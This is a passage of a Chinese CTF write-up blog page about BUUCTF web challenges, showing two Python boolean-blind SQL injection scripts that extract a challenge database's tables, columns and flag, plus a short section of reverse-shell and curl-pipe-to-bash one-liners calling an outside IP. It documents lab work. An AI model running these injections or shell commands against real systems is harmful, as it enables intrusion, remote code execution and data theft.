class="line">fb31bd3c&#125;</span><br><span class="line"></span><br><span class="line">flag&#123;4cd78d20-fd92-49b6-aa8e-fab6fb31bd3c&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>注意有一点带不带分号都可以！不知道为啥！</p>
+<p>感觉bool和延迟很像！</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#然后是二分法，二分法要快很多：</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&quot;http://bd643719-81b8-4f42-a4ec-160065111100.node3.buuoj.cn/&quot;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">payload</span>(<span class="params">i,j</span>):</span></span><br><span class="line">    <span class="comment"># sql = &quot;1^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)^1&quot;%(i,j)                                #数据库名字          </span></span><br><span class="line">    <span class="comment"># sql = &quot;1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;geek&#x27;),%d,1))&gt;%d)^1&quot;%(i,j)           #表名</span></span><br><span class="line">    <span class="comment"># sql = &quot;1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),%d,1))&gt;%d)^1&quot;%(i,j)        #列名</span></span><br><span class="line">    <span class="comment">#sql = &quot;-1/**/or/**/case/**/when/**/ascii(substr(database()/**/from/**/%d/**/for/**/1))&gt;%d/**/then/**/1/**/else/**/0/**/end#&quot;%(i,j)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#sql= &quot;-1/**/or/**/case/**/when/**/ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)/**/like(&#x27;ctf&#x27;))/**/from/**/%d/**/for/**/1))&gt;/**/(&#x27;%d&#x27;)/**/then/**/1/**/else/**/0/**/end/**/#&quot; %(i,j)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#sql=&quot;-1/**/or/**/case/**/when/**/ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)/**/like(&#x27;flag&#x27;))/**/from/**/%d/**/for/**/1))&gt;/**/(%d)/**/then/**/1/**/else/**/0/**/end/**/#;&quot; %(i,j)</span></span><br><span class="line">    <span class="comment">#sql=&quot;-1/**/or/**/case/**/when/**/ascii(substr((select(group_concat(value))from(flag))/**/from/**/%d/**/for/**/1))&gt;/**/(&#x27;%d&#x27;)/**/then/**/1/**/else/**/0/**/end/**/#&quot;%(i,j)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#sql=&quot;-1/**/or/**/case/**/when/**/ascii(substr(mid((select(group_concat(value))from(flag))/**/from/**/%d/**/for/**/1),2,4))&gt;/**/(&#x27;%d&#x27;)/**/then/**/1/**/else/**/0/**/end/**/#&quot;%(i,j)</span></span><br><span class="line">    <span class="comment">#sql=&quot;-1/**/or/**/case/**/when/**/ascii(substr(LEFT((select(group_concat(value))from(flag)),10)/**/from/**/%d/**/for/**/1))&gt;/**/(&#x27;%d&#x27;)/**/then/**/1/**/else/**/0/**/end/**/#;&quot;%(i,j)</span></span><br><span class="line">    sql=<span class="string">&quot;-1/**/or/**/case/**/when/**/ascii(substr(mid((select(group_concat(value))from(flag)),32,45)/**/from/**/%d/**/for/**/1))&gt;/**/(&#x27;%d&#x27;)/**/then/**/1/**/else/**/0/**/end/**/#;&quot;</span>%(i,j)</span><br><span class="line">    data = &#123;<span class="string">&quot;stunum&quot;</span>:sql&#125;</span><br><span class="line">    r = requests.get(url,params=data)</span><br><span class="line">    <span class="comment"># print (r.url)</span></span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">429</span>:</span><br><span class="line"></span><br><span class="line">        print(<span class="string">&#x27;too fast&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        time.sleep(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Hi admin, your score is: 100&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        res = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10000</span>) :</span><br><span class="line">        print(i,<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">        low = <span class="number">31</span></span><br><span class="line">        high = <span class="number">127</span></span><br><span class="line">        <span class="keyword">while</span> low &lt;= high :</span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line">            res = payload(i,mid)</span><br><span class="line">            <span class="keyword">if</span> res :</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span> :</span><br><span class="line">                high = mid - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        f = int((low + high + <span class="number">1</span>)) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> (f == <span class="number">127</span> <span class="keyword">or</span> f == <span class="number">31</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># print (f)</span></span><br><span class="line">        flag += chr(f)</span><br><span class="line">        print(flag)</span><br><span class="line"> </span><br><span class="line">exp()</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="大佬的xep"><a href="#大佬的xep" class="headerlink" title="大佬的xep"></a>大佬的xep</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://8a12a75e-26f1-4a40-ad74-95086cfef9df.node3.buuoj.cn/?stunum=&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>( <span class="literal">True</span> ):</span><br><span class="line">	i = i + <span class="number">1</span> </span><br><span class="line">	head=<span class="number">32</span></span><br><span class="line">	tail=<span class="number">127</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span>( head &lt; tail ):</span><br><span class="line">		mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">#payload = &quot;if(ascii(substr(database(),%d,1))&gt;%d,1,0)&quot; % (i , mid)</span></span><br><span class="line">		payload = <span class="string">&quot;if(ascii(substr((select/**/group_concat(table_name)from(information_schema.tables)where(table_schema=database())),%d,1))&gt;%d,1,0)&quot;</span> % (i , mid)</span><br><span class="line"></span><br><span class="line">		r = requests.get(url+payload)</span><br><span class="line">		r.encoding = <span class="string">&quot;utf-8&quot;</span></span><br><span class="line">		<span class="comment">#print(url+payload)</span></span><br><span class="line">		<span class="keyword">if</span> <span class="string">&quot;your score is: 100&quot;</span> <span class="keyword">in</span> r.text :</span><br><span class="line">			head = mid + <span class="number">1</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="comment">#print(r.text)</span></span><br><span class="line">			tail = mid</span><br><span class="line">	</span><br><span class="line">	last = result</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> head!=<span class="number">32</span>:</span><br><span class="line">		result += chr(head)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	print(result)</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="突然想起来反弹shell了！"><a href="#突然想起来反弹shell了！" class="headerlink" title="突然想起来反弹shell了！"></a>突然想起来反弹shell了！</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -c &quot;bash -i &gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;1.1.1.1&#x2F;5555 0&gt;&amp;1&quot;</span><br><span class="line">curl 1.1.1.1|bash</span><br><span class="line">curl http:&#x2F;&#x2F;1.1.1.1|bash</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210120231433.png" alt="image-20210120175814440"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210120231434.png" alt="image-20210120175914577"></p>
+<p>就是不知道为啥！以前测的时候可以！可是有一天学长测的时候出问题！结果我晚上测的时候也不行了！</p>
+<p>现在又可以了！日了网络这东西太😫😫😫!</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">uploads</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://tanchiyu.top/2021/01/20/BUUCTF-13/">https://tanchiyu.top/2021/01/20/BUUCTF-13/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://tanchiyu.top" target="_blank">Tcy👦♥QQ👧</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ssti/">ssti</a><a class="post-meta__tags" href="/tags/sql-bool%E7%9B%B2%E6%B3%A8/">sql bool盲注</a><a class="post-meta__tags" href="/tags/pin%E7%A0%81ssti%E5%88%A9%E7%94%A8PIN%E7%A0%81%E8%BF%9B%E8%A1%8CRCE/">pin码ssti利用PIN码进行RCE</a><a class="post-meta__tags" href="/tags/shopxo%E5%90%8E%E5%8F%B0%E5%85%A8%E7%89%88%E6%9C%AC%E8%8E%B7%E5%8F%96shell/">shopxo后台全版本获取shell</a><a class="post-meta__tags" href="/tags/Smarty-SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">Smarty SSTI模板注入</a><a class="post-meta__tags" href="/tags/PHP-mt-rand-%E9%9A%8F%E6%9C%BA%E6%95%B0%E5%AE%89%E5%85%A8/">PHP mt_rand()随机数安全</a><a class="post-meta__tags" href="/tags/%E5%8F%8D%E5%BC%B9shell%E5%AE%9E%E9%AA%8C/">反弹shell实验</a></div><div class="post_share"><div class="social-share" data-image="/image/ttt.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/01/21/BUUCTF-14/"><img class="prev-cover" data-lazy-src="/image/ttt.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">BUUCTF14</div></div></a></div><div class="next-post pull-right"><a href="/2021/01/19/BUUCTF-12/"><img class="next-cover" data-lazy-src="/image/ttt.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">BUUCTF12</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/01/04/BUUCTF-4/" title="BUUCTF4"><img class="cover" data-lazy-src="/image/ttt.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-04</div><div class="title">BUUCTF4</div></div></a></div><div><a href="/2021/01/03/BUUCTF-3/" title="BUUCTF3"><img class="cover" data-lazy-src="/image/ttt.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-03</div><div class="title">BUUCTF3</div></div></a></div><div><a href="/2021/02/02/BUUCTF-22/" title=""><img class="cover" data-lazy-src="/image/ttt.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-02-02</div><div class="title"></div></div></a></div><div><a href="/2021/01/22/BUUCTF-15/" title="BUUCTF"><img class="cover" data-lazy-src="/image/ttt.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-22</div><div class="title">BUUCTF</div></div></a></div><div><a href="/2021/01/08/BUUCTF-7/" title="BUUCTF7"><img class="cover" data-lazy-src="/image/ttt.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-08</div><div class="title">BUUCTF7</div></div></a></div><div><a href="/2021/01/06/BUUCTF-5/" title="BUUCTF5"><img class="cover" data-lazy-src="/image/ttt.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-06</div><div class="title">BUUCTF5</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" data-lazy-src="/image/pp.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">uploads</div><div class="author-info__description">每天都要开心</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">54</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">107</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://tcyba.github.io/"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/tcyba" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:2384372932@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">我希望我以后每天都能开开心心！</div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="card-content"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#GYCTF2020-FlaskApp"><span class="toc-number">1.</span> <span class="toc-text">[GYCTF2020]FlaskApp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ctf%E4%B8%ADflask-ssti%E7%9A%84%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7"><span class="toc-number">1.1.</span> <span class="toc-text">ctf中flask_ssti的各种绕过技巧:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83Templates-Injections%E7%9A%84payload%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">参考Templates Injections的payload：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.3.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8B%BC%E6%8E%A5%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.</span> <span class="toc-text">字符串拼接绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#payload"><span class="toc-number">1.4.1.</span> <span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8PIN%E7%A0%81%E8%BF%9B%E8%A1%8CRCE"><span class="toc-number">1.5.</span> <span class="toc-text">利用PIN码进行RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%90%E8%A1%8Cflask%E6%89%80%E7%99%BB%E5%BD%95%E7%9A%84%E7%94%A8%E6%88%B7%E5%90%8D"><span class="toc-number">1.5.1.</span> <span class="toc-text">服务器运行flask所登录的用户名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%BA%E5%99%A8%E7%9A%84id"><span class="toc-number">1.5.2.</span> <span class="toc-text">机器的id</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GKCTF2020-%E8%80%81%E5%85%AB%E5%B0%8F%E8%B6%85%E5%B8%82%E5%84%BF"><span class="toc-number">2.</span> <span class="toc-text">[GKCTF2020]老八小超市儿</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-shopxo%E5%90%8E%E5%8F%B0%E5%85%A8%E7%89%88%E6%9C%AC%E8%8E%B7%E5%8F%96shell%E5%A4%8D%E7%8E%B0"><span class="toc-number">2.1.</span> <span class="toc-text">渗透测试|shopxo后台全版本获取shell复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getshell"><span class="toc-number">2.2.</span> <span class="toc-text">getshell</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web11"><span class="toc-number">3.</span> <span class="toc-text">[CISCN2019 华东南赛区]Web11</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5payload1"><span class="toc-number">3.1.</span> <span class="toc-text">直接payload1:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#payload2"><span class="toc-number">3.2.</span> <span class="toc-text">payload2:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#curl%E5%91%BD%E4%BB%A4"><span class="toc-number">3.3.</span> <span class="toc-text">curl命令</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96"><span class="toc-number">4.</span> <span class="toc-text">[GWCTF 2019]枯燥的抽奖</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0"><span class="toc-number">4.1.</span> <span class="toc-text">伪随机数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0"><span class="toc-number">4.2.</span> <span class="toc-text">学习文章</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp1"><span class="toc-number">4.3.</span> <span class="toc-text">exp1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp2"><span class="toc-number">4.4.</span> <span class="toc-text">exp2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%8D%E7%88%86%E5%87%BA%E7%BB%93%E6%9E%9Cexp3"><span class="toc-number">4.5.</span> <span class="toc-text">再爆出结果exp3</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BSidesCF-2019-Futurella"><span class="toc-number">5.</span> <span class="toc-text">[BSidesCF 2019]Futurella</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WUSTCTF2020-%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2"><span class="toc-number">6.</span> <span class="toc-text">[WUSTCTF2020]颜值成绩查询</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#payload-1"><span class="toc-number">6.1.</span> <span class="toc-text">payload:</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95-%E6%9A%B4%E5%BA%93%EF%BC%9A"><span class="toc-number">6.1.1.</span> <span class="toc-text">测试+暴库：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#-1"><span class="toc-number">6.1.2.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8C%85%E8%A1%A8"><span class="toc-number">6.1.3.</span> <span class="toc-text">包表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E5%AD%97%E6%AE%B5"><span class="toc-number">6.1.4.</span> <span class="toc-text">爆字段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E5%86%85%E5%AE%B9"><span class="toc-number">6.1.5.</span> <span class="toc-text">爆内容</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">6.1.6.</span> <span class="toc-text">exp:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E4%BD%AC%E7%9A%84xep"><span class="toc-number">6.1.7.</span> <span class="toc-text">大佬的xep</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AA%81%E7%84%B6%E6%83%B3%E8%B5%B7%E6%9D%A5%E5%8F%8D%E5%BC%B9shell%E4%BA%86%EF%BC%81"><span class="toc-number">7.</span> <span class="toc-text">突然想起来反弹shell了！</span></a></li></ol></div></div></div><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/02/06/hackme%E9%9D%B6%E5%9C%BA/" title="hackme靶场"><img data-lazy-src="/image/ttt.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="hackme靶场"/></a><div class="content"><a class="title" href="/2021/02/06/hackme%E9%9D%B6%E5%9C%BA/" title="hackme靶场">hackme靶场</a><time datetime="2021-02-06T13:26:18.000Z" title="发表于 2021-02-06 21:26:18">2021-02-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/02/05/Pikachu%E9%9D%B6%E5%9C%BA/" title="Pikachu靶场"><img data-lazy-src="/image/ttt.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Pikachu靶场"/></a><div class="content"><a class="title" href="/2021/02/05/Pikachu%E9%9D%B6%E5%9C%BA/" title="Pikachu靶场">Pikachu靶场</a><time datetime="2021-02-05T06:35:59.000Z" title="发表于 2021-02-05 14:35:59">2021-02-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/02/05/%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/" title="工具学习"><img data-lazy-src="/image/ttt.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="工具学习"/></a><div class="content"><a class="title" href="/2021/02/05/%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/" title="工具学习">工具学习</a><time datetime="2021-02-05T03:48:26.000Z" title="发表于 2021-02-05 11:48:26">2021-02-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/02/02/BUUCTF-22/" title="无题"><img data-lazy-src="/image/ttt.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无题"/></a><div class="content"><a class="title" href="/2021/02/02/BUUCTF-22/" title="无题">无题</a><time datetime="2021-02-02T03:00:17.000Z" title="发表于 2021-02-02 11:00:17">2021-02-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/02/01/BUUCTF-21/" title="BUUCTF21"><img data-lazy-src="/image/ttt.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BUUCTF21"/></a><div class="content"><a class="title" href="/2021/02/01/BUUCTF-21/" title="BUUCTF21">BUUCTF21</a><time datetime="2021-02-01T06:14:07.000Z" title="发表于 2021-02-01 14:14:07">2021-02-01</time></div></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/2.jpg)"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By uploads</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="rightside.chat_btn"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.spacingElementById('content-inner')
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.spacingElementById('content-inner')
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',()=> {preloader.endLoading()})</script><div class="js-pjax"><script>if (!window.MathJax) {
+  window.MathJax = {
+    loader: {
+      source: {
+        '[tex]/amsCd': '[tex]/amscd'
+      }
+    },
+    tex: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"]],
+      tags: 'ams'
+    },
+    options: {
+      renderActions: {
+        findScript: [10, doc => {
+          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+            const display = !!node.type.match(/; *mode=display/)
+            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+            const text = document.createTextNode('')
+            node.parentNode.replaceChild(text, node)
+            math.start = {node: text, delim: '', n: 0}
+            math.end = {node: text, delim: '', n: 0}
+            doc.math.push(math)
+          }
+        }, ''],
+        addClass: [200,() => {
+          document.querySelectorAll('mjx-container:not([display=\'true\']').forEach( node => {
+            const target = node.parentNode
+            if (!target.classList.contains('has-jax')) {
+              target.classList.add('mathjax-overflow')
+            }
+          })
+        }, '', false]
+      }
+    }
+  }
+  
+  const script = document.createElement('script')
+  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js'
+  script.id = 'MathJax-script'
+  script.async = true
+  document.head.appendChild(script)
+} else {
+  MathJax.startup.document.state(0)
+  MathJax.texReset()
+  MathJax.typeset()
+}</script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex@latest/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.css"><script>(() => {
+  document.querySelectorAll('#article-container span.katex-display').forEach(item => {
+    btf.wrap(item, 'div', '', 'katex-wrap')
+  })
+})()</script><script>if (document.getElementsByClassName('mermaid').length) {
+  if (window.mermaidJsLoad) mermaid.init()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(() => {
+      window.mermaidJsLoad = true
+      mermaid.initialize({
+        theme: 'neutral',
+      })
+      false && mermaid.init()
+    })
+  }
+}</script><script>function loadValine () {
+  function initValine () {
+    let initData = {
+      el: '#vcomment',
+      appId: '',
+      appKey: '',
+      placeholder: 'Please leave your footprints',
+      avatar: 'monsterid',
+      meta: 'nick,mail,link'.split(','),
+      pageSize: '10',
+      lang: 'en',
+      recordIP: false,
+      serverURLs: '',
+      emojiCDN: '',
+      emojiMaps: "",
+      enableQQ: false,
+      path: window.location.pathname,
+    }
+
+    if (true) { 
+      initData.requiredFields= ('nick,mail'.split(','))
+    }
+    
+    if (false) {
+      const otherData = false
+      initData = Object.assign({}, initData, otherData)
+    }
+    
+    const valine = new Valine(initData)
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.querySelector('#vcomment'),loadValine)
+  else setTimeout(() => loadValine(), 0)
+} else {
+  function loadOtherComment () {
